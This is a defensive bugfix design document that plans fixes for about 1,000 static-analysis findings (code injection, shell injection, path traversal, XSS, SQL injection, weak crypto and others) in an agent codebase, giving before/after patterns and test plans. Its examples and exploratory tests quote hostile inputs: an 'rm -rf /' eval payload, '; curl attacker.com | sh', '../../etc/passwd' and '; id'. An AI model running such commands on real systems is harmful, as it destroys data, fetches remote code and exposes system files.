# Production Readiness Fixes — Bugfix Design

## Overview

Agent Guru's codebase contains 1,000 security, reliability, and correctness defects identified by
Amazon Q / Bandit static analysis across three severity tiers (44 Critical, 635 High, 321 Medium).
The fix strategy is systematic and batch-oriented: every defect is addressed with a production-grade
pattern, grouped by vulnerability class so that a single code-review pass covers all instances of
each pattern. No stubs, no workarounds — every change must pass Bandit, mypy strict, and the full
test suite.

Fix approach per tier:
- **Critical** — eliminate code injection, exposed credentials, and weak crypto first.
- **High** — harden all OS command calls, file paths, exception handlers, output rendering,
  database queries, embedding auth, and XML parsing.
- **Medium** — close resource leaks, modernise deprecated APIs, apply PyTorch best practices,
  fix multiprocessing, and add network timeouts.


## Glossary

- **Bug_Condition (C)**: A predicate over a code site X that returns `true` when X exhibits one of
  the 23 defect categories enumerated in `bugfix.md` (CWE-94, CWE-798, CWE-327, CWE-77/78/88,
  CWE-22, CWE-396/397, CWE-79/80, CWE-943, CWE-89, CWE-200/284/20, CWE-200, CWE-732/266,
  platform-API, CWE-611, CWE-20, CWE-400/664, deprecated-API, PyTorch-eval, PyTorch-seeds,
  PyTorch-tensor, DataLoader, multiprocessing, network-timeout, language).
- **Property (P)**: The desired post-fix observable at each site — e.g. `shell_injection_prevented`,
  `resource_closed_on_exit`, `no_grad_applied`.
- **Preservation**: All code sites where `isBugCondition(X) = false` must produce identical
  observable behaviour before and after the fix.
- **F**: The original (unfixed) function or code site.
- **F'**: The fixed function or code site.
- **Base directory**: The application-controlled root path against which all user-derived paths are
  validated (e.g. `DATA_DIR`, `MODEL_DIR`).
- **Cosine similarity threshold**: The minimum similarity score (≥ 0.85 for general retrieval,
  ≥ 0.97 for biometric auth) below which an embedding match is rejected.
- **Structured dispatch**: A mapping from an allowlisted string key to a pre-defined callable,
  replacing `exec`/`eval` with no user-controlled code execution.


## Bug Details

### Bug Condition

The defects span 23 distinct vulnerability classes. A code site X is buggy when any of the
following hold:

**Formal Specification:**
```
FUNCTION isBugCondition(X)
  INPUT: X — a code site of one of the 23 recognised types
  OUTPUT: boolean

  // CRITICAL
  IF X.type = code_exec_site  AND X.uses_exec_or_eval AND X.input_is_user_controlled  → true
  IF X.type = credential_source AND X.is_literal_in_source                             → true
  IF X.type = crypto_op AND X.algorithm IN {MD5, SHA1, DES, RC4}                      → true

  // HIGH
  IF X.type = subprocess_call AND X.shell=true AND X.input_is_user_controlled          → true
  IF X.type = file_path_op AND X.path_is_user_controlled AND NOT X.canonicalized       → true
  IF X.type = exception_handler AND X.handler_type=generic AND X.action=pass           → true
  IF X.type = output_render AND X.data_is_user_supplied AND NOT X.escaped              → true
  IF X.type = nosql_query AND NOT X.uses_parameterized_api AND X.input_is_user_ctrl    → true
  IF X.type = sql_query AND NOT X.uses_parameterized_api AND X.input_is_user_ctrl      → true
  IF X.type = embedding_auth AND NOT X.threshold_validated                             → true
  IF X.type = sensitive_output AND NOT X.data_redacted                                 → true
  IF X.type = file_permission AND NOT X.permissions_restrictive                        → true
  IF X.type = platform_api_call AND NOT X.api_works_on_all_platforms                  → true
  IF X.type = xml_parse AND NOT X.external_entities_disabled                           → true
  IF X.type = public_method_call AND NOT X.parameters_validated                        → true

  // MEDIUM
  IF X.type = resource_open AND NOT X.uses_context_manager AND NOT X.has_finally_close → true
  IF X.type = deprecated_api_call AND NOT X.api_is_current                             → true
  IF X.type = eval_mode AND NOT X.no_grad_context                                      → true
  IF X.type = training_init AND NOT X.random_seeds_set                                 → true
  IF X.type = tensor_creation AND X.created_on_cpu_then_moved                          → true
  IF X.type = dataloader_config AND X.num_workers_causes_memory_growth                 → true
  IF X.type = multiprocessing_call AND NOT X.correct_api_and_params                   → true
  IF X.type = network_connection AND NOT X.timeout_set                                 → true
  IF X.type = language_content AND X.is_unprofessional                                 → true

  RETURN false
END FUNCTION
```

### Examples

- **CWE-94**: `calculator_skill.py:47` calls `eval(user_expression)` — attacker passes
  `"__import__('os').system('rm -rf /')"` and achieves RCE. Fix: replace with
  `ast.literal_eval` or a dedicated safe math parser.
- **CWE-798**: `ollama_provider.py:49` contains `API_KEY = "sk-abc123..."` — any developer
  with repo access obtains the credential. Fix: `API_KEY = os.environ["OLLAMA_API_KEY"]`.
- **CWE-327**: `key_store.py:65` derives keys with MD5 — trivially reversible. Fix: Argon2id
  with recommended parameters (time=3, memory=65536, parallelism=4).
- **CWE-77**: `application_control.py:630` calls `subprocess.run(cmd, shell=True)` where `cmd`
  contains user input — attacker appends `; curl attacker.com | sh`. Fix:
  `subprocess.run([binary, *args], shell=False)`.
- **CWE-22**: `file_operations.py:304` opens `open(user_path)` — attacker passes
  `"../../etc/passwd"`. Fix: `assert resolved.is_relative_to(BASE_DIR)`.
- **CWE-396**: `fallback.py:111` has `except Exception: pass` — swallows all errors silently.
  Fix: `except (SpecificError, AnotherError) as e: logger.warning("fallback failed: %s", e)`.
- **CWE-79**: `synthesizer.py:1324` interpolates user text into an HTML template without
  `html.escape()` — stored XSS. Fix: `html.escape(user_text)` before interpolation.
- **CWE-89**: `goal_engine.py:265` builds `f"SELECT … WHERE id='{user_id}'"` — SQL injection.
  Fix: `session.execute(text("SELECT … WHERE id=:id"), {"id": user_id})`.
- **CWE-400**: `meta_learner.py:197` calls `open(path)` without `with` — descriptor leaked on
  exception. Fix: `with open(path) as f: …`.
- **PyTorch**: `evaluate_models.py:132` runs inference without `torch.no_grad()` — 2× memory
  overhead. Fix: wrap forward pass in `with torch.no_grad(): …`.


## Expected Behavior

### Preservation Requirements

**Unchanged Behaviors:**
- Subprocess calls that use fully-trusted, internally-constructed argument lists with no user input
  must continue to invoke subprocesses as before (Requirement 3.1).
- File paths constructed entirely from internal constants or configuration values must continue to
  be accessed without additional validation overhead (Requirement 3.2).
- Genuinely expected and handled exceptions (e.g. `FileNotFoundError` on an optional config file)
  must continue to be handled gracefully, provided the handler logs the event (Requirement 3.3).
- Files and connections already opened via correct context managers must not be modified (Req 3.4).
- NoSQL/SQL queries constructed from internally validated, non-user-supplied data must continue to
  execute without change (Requirement 3.5).
- Training runs with seeds already set must continue to produce the same model weights given the
  same data and hyperparameters (Requirement 3.6).
- Cryptographic operations already using OWASP/NIST-recommended algorithms must not be changed
  (Requirement 3.7).
- Embedding comparisons already enforcing strict thresholds must not be changed (Requirement 3.8).
- XML parsing already using `defusedxml` or equivalent safe configuration must not be changed
  (Requirement 3.9).
- Public methods already validating their parameters must not be changed (Requirement 3.10).

**Scope:**
All code sites where `isBugCondition(X) = false` must produce identical observable behaviour
before and after the fix. This includes all internal-only subprocess calls, all trusted-path file
operations, all already-correct exception handlers, and all already-correct resource management.


## Hypothesized Root Cause

The defects share a common origin: the codebase was built rapidly with a focus on feature
completeness, and security/reliability hardening was deferred. Specific root causes by category:

1. **Code Injection (CWE-94)**: `exec`/`eval` used as a convenience shortcut for dynamic dispatch
   in plugin loaders, skill runners, and test harnesses — no allowlist or sandboxing was applied.

2. **Hardcoded Credentials (CWE-798)**: API keys and tokens were committed during early development
   for convenience and never rotated to environment-variable reads. Test files use real-looking
   credential strings as fixture values.

3. **Weak Crypto (CWE-327)**: Legacy MD5/SHA-1 calls were copied from older utility code or
   third-party examples without reviewing OWASP recommendations.

4. **OS Command Injection (CWE-77/78/88)**: `subprocess.run(cmd, shell=True)` was used throughout
   platform-integration and automation modules because it is easier to compose shell pipelines
   inline. User-controlled strings were concatenated directly into the command.

5. **Path Traversal (CWE-22)**: File paths received from configuration, user input, or network
   responses were passed directly to `open()` / `pathlib.Path()` without canonicalization or
   base-directory assertion.

6. **Generic Exception Pass (CWE-396/397)**: `except Exception: pass` was used as a blanket
   suppressor in test setup/teardown and in fallback handlers to avoid test noise, but was never
   replaced with typed handlers in production code.

7. **XSS (CWE-79/80)**: User-supplied strings were interpolated into f-strings or Jinja-like
   templates that produce HTML/text output without `html.escape()`.

8. **Injection (CWE-89/943)**: Query strings were built with f-string interpolation rather than
   parameterized queries, a common pattern when prototyping.

9. **Embedding Auth (CWE-200/284/20)**: Cosine similarity comparisons lacked explicit threshold
   guards — any non-zero similarity could pass authentication.

10. **Resource Leaks (CWE-400/664)**: `open()` and connection constructors were called without
    `with` statements, leaving descriptors open on exception paths.

11. **PyTorch Issues**: Inference code was written without `torch.no_grad()` guards (common
    oversight when porting training code to evaluation), and seeds were not set because
    reproducibility was not a priority during initial development.

12. **Remaining issues** (deprecated APIs, multiprocessing, network timeout, XXE, permissions,
    language): Each is an isolated oversight in the relevant module, not a systemic pattern.


## Correctness Properties

Property 1: Bug Condition — Code Injection Prevention (CWE-94)

_For any_ code site X where `isBugCondition(X)` is true and X.type = `code_exec_site`, the fixed
code SHALL NOT execute user-controlled strings as Python code. It SHALL use structured dispatch
(allowlist mapping), `ast.literal_eval`, or a sandboxed safe-math parser, and SHALL raise
`ValueError` for any input not in the allowlist.

**Validates: Requirements 2.1, 2.4, 2.5, 2.6**

---

Property 2: Bug Condition — Credential Exposure Prevention (CWE-798)

_For any_ code site X where `isBugCondition(X)` is true and X.type = `credential_source`, the
fixed code SHALL NOT contain a credential literal. Production code SHALL read credentials from
`os.environ` or the OS keychain. Test files SHALL use clearly-marked placeholder strings
(e.g. `"test-placeholder-not-real"`) that cannot be mistaken for real credentials.

**Validates: Requirements 2.2**

---

Property 3: Bug Condition — Strong Cryptography (CWE-327)

_For any_ code site X where `isBugCondition(X)` is true and X.type = `crypto_op`, the fixed code
SHALL use AES-256-GCM for symmetric encryption, SHA-256 or stronger for hashing, and Argon2id
(time=3, memory=65536, parallelism=4) for key derivation. MD5, SHA-1, DES, and RC4 SHALL NOT
appear.

**Validates: Requirements 2.3**

---

Property 4: Bug Condition — OS Command Injection Prevention (CWE-77/78/88)

_For any_ code site X where `isBugCondition(X)` is true and X.type = `subprocess_call`, the fixed
code SHALL call `subprocess.run([binary, *args], shell=False)` with a list of arguments. If user
input must be included, it SHALL be validated against an allowlist before being placed in the
argument list. `shell=True` SHALL NOT be used with any user-controlled data.

**Validates: Requirements 2.7**

---

Property 5: Bug Condition — Path Traversal Prevention (CWE-22)

_For any_ code site X where `isBugCondition(X)` is true and X.type = `file_path_op`, the fixed
code SHALL call `pathlib.Path(user_input).resolve()` and assert
`resolved_path.is_relative_to(BASE_DIR)` before any file operation. Paths that escape the base
directory SHALL raise `PermissionError` or `ValueError`.

**Validates: Requirements 2.8**

---

Property 6: Bug Condition — Typed Exception Handling (CWE-396/397)

_For any_ code site X where `isBugCondition(X)` is true and X.type = `exception_handler`, the
fixed code SHALL catch only specific exception types (never bare `except:` or `except Exception:
pass`). Every handler SHALL either log the exception at `WARNING` or higher, re-raise it, or
return a documented sentinel value. Silent swallowing SHALL NOT occur.

**Validates: Requirements 2.9**

---

Property 7: Bug Condition — Output Escaping (CWE-79/80)

_For any_ code site X where `isBugCondition(X)` is true and X.type = `output_render`, the fixed
code SHALL apply `html.escape(value)` (or equivalent context-appropriate escaping) to every
user-supplied string before it appears in any output. HTTP responses SHALL include a
`Content-Security-Policy` header.

**Validates: Requirements 2.10**

---

Property 8: Bug Condition — Parameterized Queries (CWE-89, CWE-943)

_For any_ code site X where `isBugCondition(X)` is true and X.type IN {`sql_query`,
`nosql_query`}, the fixed code SHALL use the driver's parameterized query interface
(`session.execute(text(sql), params)` for SQL; typed filter objects or `$eq` operators for
NoSQL). String interpolation of user input into query strings SHALL NOT occur.

**Validates: Requirements 2.11, 2.12**

---

Property 9: Bug Condition — Embedding Authentication Threshold (CWE-200/284/20)

_For any_ code site X where `isBugCondition(X)` is true and X.type = `embedding_auth`, the fixed
code SHALL enforce a cosine similarity threshold ≥ 0.97 for biometric authentication and ≥ 0.85
for general retrieval. Comparisons that fall below the threshold SHALL be rejected. Secondary
liveness or verification SHALL be applied before granting access.

**Validates: Requirements 2.13**

---

Property 10: Bug Condition — Sensitive Data Redaction (CWE-200)

_For any_ code site X where `isBugCondition(X)` is true and X.type = `sensitive_output`, the
fixed code SHALL redact or omit sensitive fields (API keys, passwords, PII, biometric data) before
writing to logs or returning in error responses.

**Validates: Requirements 2.14**

---

Property 11: Bug Condition — Restrictive File Permissions (CWE-732/266)

_For any_ code site X where `isBugCondition(X)` is true and X.type = `file_permission`, the fixed
code SHALL create files with permissions `0o600` and directories with `0o700`, applied via
`os.chmod` or `pathlib.Path.chmod` immediately after creation.

**Validates: Requirements 2.15**

---

Property 12: Bug Condition — Safe XML Parsing (CWE-611)

_For any_ code site X where `isBugCondition(X)` is true and X.type = `xml_parse`, the fixed code
SHALL use `defusedxml.ElementTree.parse()` or SHALL configure the parser with
`resolve_entities=False` and no external DTD loading. Standard `xml.etree.ElementTree` SHALL NOT
be used with untrusted input.

**Validates: Requirements 2.18**

---

Property 13: Bug Condition — Resource Closure (CWE-400/664)

_For any_ code site X where `isBugCondition(X)` is true and X.type = `resource_open`, the fixed
code SHALL use a `with` statement (context manager) or SHALL guarantee closure in a `finally`
block. Resources SHALL be released even when exceptions occur.

**Validates: Requirements 2.21**

---

Property 14: Bug Condition — PyTorch Inference Guard

_For any_ code site X where `isBugCondition(X)` is true and X.type = `eval_mode`, the fixed code
SHALL wrap the forward pass in `with torch.no_grad():`. Gradient tracking SHALL NOT be active
during evaluation or inference.

**Validates: Requirements 2.23**

---

Property 15: Bug Condition — Deterministic Training Seeds

_For any_ code site X where `isBugCondition(X)` is true and X.type = `training_init`, the fixed
code SHALL call `random.seed(seed)`, `np.random.seed(seed)`, `torch.manual_seed(seed)`, and
`torch.cuda.manual_seed_all(seed)` before any stochastic operation. The seed value SHALL be
configurable and logged.

**Validates: Requirements 2.24**

---

Property 16: Preservation — Non-Buggy Sites Unchanged

_For any_ code site X where `isBugCondition(X)` returns false, the fixed codebase SHALL produce
the same observable behaviour as the original codebase: same return values, same side effects,
same exception types raised, same subprocess invocations, same file operations, same query
results.

**Validates: Requirements 3.1, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7, 3.8, 3.9, 3.10**


## Fix Implementation

### Architecture Overview

All fixes are applied in-place to the existing modules. No new abstraction layers are introduced
unless a shared utility already exists (e.g. `Agent_Guru/security/`). The fix strategy is:

1. **Shared utilities first** — add `safe_subprocess`, `safe_path`, `safe_xml_parse`, and
   `set_deterministic_seeds` helpers to appropriate existing modules so all call sites can import
   them rather than duplicating the pattern.
2. **Batch by vulnerability class** — fix all instances of one CWE before moving to the next,
   enabling focused review and a single Bandit re-scan per class.
3. **Test files last** — production code is fixed first; test files are updated to use placeholder
   credentials and typed exception handlers in a separate pass.

---

### Batch 1 — Critical: Code Injection (CWE-94)

**Files**: `__init__.py:37`, `async_executor.py:162`, `loader.py:165`, `calculator_skill.py:47`,
`run_100_task_cycle.py:35`, `sandbox.py:29`, `verify_installation.py:43/71`

**Pattern**:
```python
# Before
exec(user_code)
eval(user_expression)

# After — structured dispatch
_ALLOWED_ACTIONS: dict[str, Callable] = {
    "action_name": _handler_fn,
}

def dispatch(action: str, **kwargs: Any) -> Any:
    if action not in _ALLOWED_ACTIONS:
        raise ValueError(f"Unknown action: {action!r}")
    return _ALLOWED_ACTIONS[action](**kwargs)

# After — safe math (calculator_skill.py)
import ast, operator as op

_SAFE_OPS = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul, ast.Div: op.truediv}

def safe_eval_expr(expr: str) -> float:
    tree = ast.parse(expr, mode="eval")
    return _eval_node(tree.body)
```

---

### Batch 2 — Critical: Hardcoded Credentials (CWE-798)

**Files**: All 22 production files and all test files listed in requirements 1.2–1.27.

**Pattern**:
```python
# Before (production)
API_KEY = "sk-abc123..."

# After (production)
import os
API_KEY: str = os.environ["SERVICE_API_KEY"]  # raises KeyError if unset — fail fast

# After (test files)
PLACEHOLDER_KEY = "test-placeholder-not-real"  # noqa: S105 — not a real credential
```

---

### Batch 3 — Critical: Weak Cryptography (CWE-327)

**Files**: `file_operations.py:1079`, `key_store.py:65`

**Pattern**:
```python
# Before
hashlib.md5(data).hexdigest()

# After — hashing
hashlib.sha256(data).hexdigest()

# Before — key derivation
hashlib.md5(password.encode()).digest()

# After — key derivation
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
kdf = Argon2id(salt=salt, length=32, iterations=3,
               lanes=4, memory_cost=65536)
key = kdf.derive(password.encode())

# After — symmetric encryption
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
aesgcm = AESGCM(key)
ciphertext = aesgcm.encrypt(nonce, plaintext, aad)
```

---

### Batch 4 — High: OS Command Injection (CWE-77/78/88)

**Files**: 200+ locations across platform, automation, speech, vision, and test modules.

**Shared utility** (add to `Agent_Guru/platform/subprocess_utils.py`):
```python
import subprocess, shlex
from pathlib import Path

def run_cmd(args: list[str], *, cwd: Path | None = None,
            timeout: int = 30, check: bool = True) -> subprocess.CompletedProcess:
    """Run a subprocess with shell=False. Never pass user input as a single string."""
    return subprocess.run(
        args, shell=False, capture_output=True, text=True,
        cwd=cwd, timeout=timeout, check=check,
    )
```

**Pattern at each call site**:
```python
# Before
subprocess.run(f"ffmpeg -i {user_file} output.wav", shell=True)

# After
from Agent_Guru.platform.subprocess_utils import run_cmd
run_cmd(["ffmpeg", "-i", str(validated_path), "output.wav"])
```

---

### Batch 5 — High: Path Traversal (CWE-22)

**Files**: 70+ locations across storage, config, training, and platform modules.

**Shared utility** (add to `Agent_Guru/security/path_utils.py`):
```python
from pathlib import Path

def safe_path(user_input: str | Path, base_dir: Path) -> Path:
    """Resolve and assert path is within base_dir. Raises PermissionError otherwise."""
    resolved = Path(user_input).resolve()
    if not resolved.is_relative_to(base_dir.resolve()):
        raise PermissionError(
            f"Path {resolved!r} escapes base directory {base_dir!r}"
        )
    return resolved
```

**Pattern at each call site**:
```python
# Before
with open(user_path) as f: ...

# After
from Agent_Guru.security.path_utils import safe_path
with open(safe_path(user_path, BASE_DIR)) as f: ...
```

---

### Batch 6 — High: Generic Exception Pass (CWE-396/397)

**Files**: 68+ locations across test files, platform controllers, speech, and ML modules.

**Pattern**:
```python
# Before
try:
    risky_operation()
except Exception:
    pass

# After
import logging
logger = logging.getLogger(__name__)

try:
    risky_operation()
except (SpecificError, AnotherExpectedError) as exc:
    logger.warning("Operation failed: %s", exc)
    # re-raise or return sentinel as appropriate
```

For test setup/teardown where suppression is intentional:
```python
except OSError as exc:
    logger.debug("Cleanup skipped: %s", exc)
```

---

### Batch 7 — High: XSS (CWE-79/80)

**Files**: 26 locations across orchestrator, synthesizer, normalizer, and ML modules.

**Pattern**:
```python
import html

# Before
output = f"<div>{user_text}</div>"

# After
output = f"<div>{html.escape(user_text)}</div>"
```

For HTTP responses, add CSP header:
```python
response.headers["Content-Security-Policy"] = (
    "default-src 'self'; script-src 'none'; object-src 'none'"
)
```

---

### Batch 8 — High: SQL & NoSQL Injection (CWE-89, CWE-943)

**Files**: `goal_engine.py:265`, `connection_pool.py:294/429`, `create_database.py:92/108`,
`command_checker.py:583`, `security.py:127/140/154`, `security_audit.py:164/200`,
`convert_to_onnx.py:48`, `evaluate_models.py:113`, `train_intent_classifier.py:52`,
`export.py:66/138`

**SQL pattern**:
```python
# Before
cursor.execute(f"SELECT * FROM goals WHERE id='{user_id}'")

# After (SQLAlchemy)
from sqlalchemy import text
session.execute(text("SELECT * FROM goals WHERE id=:id"), {"id": user_id})
```

**NoSQL pattern**:
```python
# Before
collection.find({"name": user_input})

# After — validate type, use driver's typed filter
if not isinstance(user_input, str) or not user_input.isidentifier():
    raise ValueError(f"Invalid query parameter: {user_input!r}")
collection.find({"name": {"$eq": user_input}})
```

---

### Batch 9 — High: Embedding Authentication Thresholds (CWE-200/284/20)

**Files**: `openai_adapter.py:181`, `memory_retriever.py:420`, `embedding.py:250`,
`biometric_auth.py:38`, `voice_auth.py:261`, `face_db.py:300`, `recognizer.py:78`,
`wake_word.py:370`, `voice_cloner.py:417/677`

**Pattern**:
```python
# Before
if cosine_similarity(query_emb, stored_emb) > 0:
    grant_access()

# After
BIOMETRIC_THRESHOLD = 0.97   # FAR < 0.1%
RETRIEVAL_THRESHOLD = 0.85

def verify_embedding(query: np.ndarray, stored: np.ndarray,
                     threshold: float = BIOMETRIC_THRESHOLD) -> bool:
    score = float(np.dot(query, stored) /
                  (np.linalg.norm(query) * np.linalg.norm(stored)))
    return score >= threshold
```

---

### Batch 10 — High: Sensitive Data Redaction (CWE-200)

**Files**: `multi_step_executor.py:457`, `app_control.py:55/124`, `process_control.py:94/161`,
`system_control.py:87/167/241/332`

**Pattern**:
```python
_REDACT_KEYS = frozenset({"password", "api_key", "token", "secret", "credential"})

def redact(data: dict) -> dict:
    return {k: "***REDACTED***" if k.lower() in _REDACT_KEYS else v
            for k, v in data.items()}

logger.info("Result: %s", redact(result))
```

---

### Batch 11 — High: File Permissions, Platform API, XXE, Language, Param Validation

**Loose permissions** (`test_goal_storage.py:197/240`):
```python
path.touch(mode=0o600)
path.mkdir(mode=0o700, parents=True)
```

**Platform API** (`compliance.py:1110/1153/1194`):
```python
import sys
if sys.platform != "win32":
    os.close(fd)
# or replace with pathlib/io abstractions that handle platform differences
```

**Multiprocessing** (`conftest.py:37`):
```python
# Replace deprecated mp.Pool(processes=N) usage with current API
import multiprocessing as mp
ctx = mp.get_context("spawn")
with ctx.Pool(processes=N) as pool:
    results = pool.map(fn, items)
```

**XXE** (`output_validator.py:100/155`, `test_testing_mode_property.py:54`):
```python
import defusedxml.ElementTree as ET
tree = ET.parse(xml_source)   # external entities disabled by default
```

**Language** (`scene.py:33`): Replace unprofessional comment/string with professional equivalent.

**Parameter validation** (6 locations):
```python
def public_method(self, value: str, count: int) -> None:
    if not isinstance(value, str) or not value.strip():
        raise ValueError(f"value must be a non-empty string, got {value!r}")
    if not isinstance(count, int) or count < 0:
        raise ValueError(f"count must be a non-negative int, got {count!r}")
```

---

### Batch 12 — Medium: Resource Leaks (CWE-400/664)

**Files**: 86+ locations across storage, test, orchestrator, speech, and ML modules.

**Pattern**:
```python
# Before
f = open(path)
data = f.read()

# After
with open(path) as f:
    data = f.read()

# Before (DB connection)
conn = sqlite3.connect(db_path)
conn.execute(sql)

# After
with sqlite3.connect(db_path) as conn:
    conn.execute(sql)
```

---

### Batch 13 — Medium: Deprecated APIs

**Files**: `package_manager.py:220`, `test_installer_builder.py:61/94/184/225`,
`update_manager.py:227/244`, `file_operations.py:1081`, `output_validator.py:100/155`,
`test_testing_mode_property.py:54`, `download_models.py:504/519`

Replace each deprecated call with the current API as documented in the respective library's
migration guide (e.g. `distutils` → `importlib.metadata`, `imp` → `importlib`,
`xml.etree` → `defusedxml`).

---

### Batch 14 — Medium: PyTorch Best Practices

**Files**: 9 `no_grad` locations, 6 seed locations, 1 tensor-on-device, 1 DataLoader.

```python
# no_grad
with torch.no_grad():
    output = model(inputs)

# seeds
def set_deterministic_seeds(seed: int = 42) -> None:
    import random
    random.seed(seed)
    np.random.seed(seed)
    torch.manual_seed(seed)
    torch.cuda.manual_seed_all(seed)

# tensor on device
device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
tensor = torch.zeros(shape, device=device)   # not .to(device) after creation

# DataLoader
DataLoader(dataset, num_workers=min(4, os.cpu_count() or 1),
           persistent_workers=True, pin_memory=True)
```

---

### Batch 15 — Medium: Multiprocessing & Network Timeout

**`sandbox.py:75`**:
```python
ctx = multiprocessing.get_context("spawn")
proc = ctx.Process(target=fn, args=args)
proc.start()
proc.join(timeout=30)
if proc.is_alive():
    proc.terminate()
```

**`verify_requirements.py:196`**:
```python
import socket
socket.setdefaulttimeout(30)
# or per-connection:
with socket.create_connection((host, port), timeout=30) as sock:
    ...
```


## Component Interfaces That Must Not Change (Regression Prevention)

The following public APIs are called by other modules and must retain identical signatures and
semantics after the fix. Any change to these would require a coordinated update across all callers.

| Module | Public API | Constraint |
|---|---|---|
| `Agent_Guru/platform/controller.py` | `PlatformController.execute_command(cmd, args)` | Signature unchanged; `shell=False` applied internally |
| `Agent_Guru/memory/encryption.py` | `MemoryEncryption.encrypt(data)` / `.decrypt(data)` | Return type unchanged; algorithm upgraded internally |
| `Agent_Guru/security/key_store.py` | `KeyStore.get(key)` / `.set(key, value)` | Signature unchanged; storage backend unchanged |
| `Agent_Guru/llm/providers/*.py` | `Provider.complete(prompt, **kwargs)` | Signature unchanged; credential source changed to env var |
| `Agent_Guru/reasoning/` goal/storage APIs | `GoalStorage.save(goal)` / `.load(id)` | Signature unchanged; path validation added internally |
| `Agent_Guru/speech/engine.py` | `SpeechEngine.process(audio)` | Signature unchanged; no_grad applied internally |
| `Agent_Guru/vision/engine.py` | `VisionEngine.recognize(frame)` | Signature unchanged; threshold enforced internally |
| All `subprocess.run` wrappers | Must accept same logical arguments | `shell=False` applied; callers pass list not string |
| All DB query methods | Must return same result sets | Parameterized queries; same SQL semantics |


## Testing Strategy

### Validation Approach

Testing follows a two-phase approach:

1. **Exploratory (pre-fix)**: Run targeted tests against unfixed code to confirm the bug manifests
   and to understand the exact failure mode. This validates the root cause hypothesis.
2. **Fix + Preservation checking (post-fix)**: Run the same tests plus property-based tests to
   confirm (a) the bug is gone for all buggy inputs and (b) non-buggy inputs are unaffected.

---

### Exploratory Bug Condition Checking

**Goal**: Surface counterexamples that demonstrate each defect class on unfixed code.

**Test Plan**: Write targeted unit tests that exercise each vulnerability class with a known-bad
input and assert the unsafe behaviour occurs. Run on unfixed code to confirm failures.

**Test Cases**:
1. **CWE-94 Exploration**: Call `calculator_skill.dispatch("__import__('os').system('id')")` —
   expect RCE or no error on unfixed code; expect `ValueError` on fixed code.
2. **CWE-798 Exploration**: Grep source for literal credential patterns — expect matches on
   unfixed code; expect zero matches on fixed code.
3. **CWE-77 Exploration**: Call a platform command function with `; id` appended to a filename
   argument — expect shell execution on unfixed code; expect `subprocess.CalledProcessError` or
   sanitised call on fixed code.
4. **CWE-22 Exploration**: Pass `"../../etc/passwd"` to a file-reading function — expect file
   read on unfixed code; expect `PermissionError` on fixed code.
5. **CWE-396 Exploration**: Trigger an exception in a function with `except Exception: pass` —
   expect silent swallow on unfixed code; expect log entry on fixed code.
6. **CWE-400 Exploration**: Induce an exception mid-function that opens a file without `with` —
   expect leaked descriptor on unfixed code; expect clean closure on fixed code.
7. **PyTorch Exploration**: Run inference without `no_grad` and measure GPU memory — expect
   elevated memory on unfixed code; expect baseline memory on fixed code.

**Expected Counterexamples**:
- `eval`/`exec` executes injected code without raising.
- Credential literals appear in `git grep` output.
- `subprocess.run(shell=True)` with injected metacharacters executes extra commands.
- Path traversal reads files outside the base directory.
- Generic `except: pass` swallows exceptions with no log output.
- File descriptors remain open after exception (detectable via `psutil.Process().open_files()`).

---

### Fix Checking

**Goal**: Verify that for all inputs where the bug condition holds, the fixed code produces the
expected safe behaviour.

**Pseudocode:**
```
FOR ALL X WHERE isBugCondition(X) DO
  result := system_after_fix(X)
  ASSERT result satisfies Property(X.type)   // see Correctness Properties section
END FOR
```

---

### Preservation Checking

**Goal**: Verify that for all inputs where the bug condition does NOT hold, the fixed code
produces the same result as the original code.

**Pseudocode:**
```
FOR ALL X WHERE NOT isBugCondition(X) DO
  ASSERT system_before_fix(X) = system_after_fix(X)
END FOR
```

**Testing Approach**: Property-based testing with Hypothesis is used for preservation checking
because it generates many inputs automatically, catches edge cases, and provides strong guarantees
across the input domain.

**Test Cases**:
1. **Subprocess Preservation**: For internally-constructed argument lists with no user input,
   verify `run_cmd` produces the same `CompletedProcess` as the original call.
2. **Path Preservation**: For paths constructed from internal constants, verify `safe_path`
   returns the same resolved path as the original `Path(p).resolve()`.
3. **Exception Preservation**: For expected exceptions (e.g. `FileNotFoundError`), verify the
   typed handler still catches them and the function returns the same sentinel value.
4. **Query Preservation**: For queries with internally-validated parameters, verify parameterized
   queries return the same result sets as the original string-interpolated queries.
5. **Crypto Preservation**: For data encrypted with the new algorithm, verify round-trip
   encrypt/decrypt returns the original plaintext.
6. **Training Preservation**: For training runs with seeds set, verify the same model weights are
   produced across two runs with the same seed and data.

---

### Unit Tests

- Test `safe_path()` rejects paths escaping `BASE_DIR` and accepts valid paths.
- Test `safe_eval_expr()` rejects non-numeric expressions and evaluates valid ones correctly.
- Test `dispatch()` raises `ValueError` for unknown actions and calls the correct handler.
- Test `verify_embedding()` rejects scores below threshold and accepts scores above.
- Test `redact()` masks all keys in `_REDACT_KEYS` and preserves all other keys.
- Test `set_deterministic_seeds()` produces identical random sequences across two calls.
- Test each `with open(...)` site closes the file descriptor on both success and exception paths.
- Test `run_cmd()` raises on non-zero exit code and does not use `shell=True`.
- Test XML parsing with a crafted XXE payload raises or returns no external data.
- Test parameter validation raises `ValueError`/`TypeError` for invalid inputs.

### Property-Based Tests

- **Property 4 (subprocess)**: For any list of strings as arguments, `run_cmd` never invokes a
  shell and always passes arguments verbatim to the OS.
- **Property 5 (path)**: For any string input, `safe_path` either returns a path within
  `BASE_DIR` or raises `PermissionError` — never returns a path outside `BASE_DIR`.
- **Property 6 (exceptions)**: For any exception raised inside a fixed handler, the exception is
  either logged or re-raised — never silently swallowed.
- **Property 8 (queries)**: For any string value passed as a query parameter, the parameterized
  query returns the same result as a manually-verified safe query with the same value.
- **Property 9 (embeddings)**: For any pair of random unit vectors, `verify_embedding` returns
  `True` iff cosine similarity ≥ threshold, and `False` otherwise — no false positives above
  threshold, no false negatives below.
- **Property 13 (resources)**: For any sequence of operations that may raise, a function using
  `with open(...)` always closes the file descriptor regardless of which operation raises.
- **Property 16 (preservation)**: For any input X where `isBugCondition(X) = false`, the fixed
  function returns the same value as the original function.

### Integration Tests

- End-to-end platform command execution: voice command → `PlatformController.execute_command` →
  subprocess → result, with injected metacharacters in the command argument, verifying no shell
  injection occurs.
- End-to-end file operation: user-supplied filename → `file_operations` → disk read, with
  traversal path, verifying `PermissionError` is raised.
- End-to-end biometric auth: face embedding comparison with a near-match embedding below
  threshold, verifying access is denied.
